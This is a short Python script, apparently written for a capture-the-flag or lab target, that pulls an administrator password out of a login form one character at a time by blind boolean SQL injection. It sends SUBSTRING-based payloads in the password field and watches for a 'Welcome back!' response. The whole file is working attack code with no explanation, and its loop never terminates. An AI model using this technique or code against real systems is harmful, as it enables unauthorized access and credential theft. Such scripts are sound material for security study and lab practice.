import requests
from string import ascii_lowercase, digits

url = 'http://blind-board-b36f6b4c.dailycookie.cloud/login'


chars = ascii_lowercase + digits
position = 1
password = ''

while True:
    for character in chars:
        payload = f'''X' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='admin')='{character}'''
        r = requests.get(url, data = {"username":"admin", "password": payload})
        if 'Welcome back!' in r.text:
            password += ''.join(character)
            print(f'[+] Found password: {password}', end='\r')
            position += 1
            break
        else:
            pass




print(f'[+] administrator password: {password}')